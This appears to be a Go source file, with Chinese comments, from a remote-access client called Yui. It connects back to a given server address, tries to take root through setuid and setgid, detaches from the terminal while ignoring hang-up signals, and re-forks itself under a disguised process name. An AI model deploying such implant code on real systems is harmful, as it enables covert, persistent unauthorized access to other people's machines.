//go:build !windows

// 此文件仅用于非Windows平台构建

package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/QingYu-Su/Yui/internal/client"
)

// Run 函数是主程序执行入口
// 参数:
//
//	destination - 目标服务器地址
//	fingerprint - 服务器指纹用于认证
//	proxyaddress - 代理服务器地址
//	sni - TLS SNI(服务器名称指示)
//	_ - 保留参数(在Windows平台上用于Kerberos认证，此处不使用)
func Run(destination, fingerprint, proxyaddress, sni string, _ bool) {
	// 尝试提升到root权限(如果是setuid/setgid二进制文件)
	syscall.Setuid(0) // 设置用户ID为root
	syscall.Setgid(0) // 设置组ID为root

	// 创建新的进程组，并忽略挂断信号
	syscall.Setsid()                               // 创建新会话并设置进程组ID
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE) // 忽略挂断和管道破裂信号

	// 在Linux平台上不能使用Windows认证
	client.Run(destination, fingerprint, proxyaddress, sni, false)
}

// Fork 函数用于创建子进程
// 参数:
//
//	destination - 目标服务器地址
//	fingerprint - 服务器指纹
//	proxyaddress - 代理地址
//	sni - TLS SNI
//	_ - 保留参数(Windows平台使用)
//	pretendArgv - 传递给子进程的参数列表
//
// 返回值:
//
//	error - 如果fork失败则返回错误
func Fork(destination, fingerprint, proxyaddress, sni string, _ bool, pretendArgv ...string) error {
	log.Println("正在创建子进程...")

	// 首先尝试通过/proc/self/exe来fork
	err := fork("/proc/self/exe", nil, pretendArgv...)
	if err != nil {
		log.Println("通过/proc/self/exe创建子进程失败:", err)

		// 如果失败，尝试通过可执行文件路径来fork
		binary, err := os.Executable()
		if err == nil {
			err = fork(binary, nil, pretendArgv...)
		}

		log.Println("通过可执行文件路径创建子进程失败:", err)
		return err
	}
	return nil
}
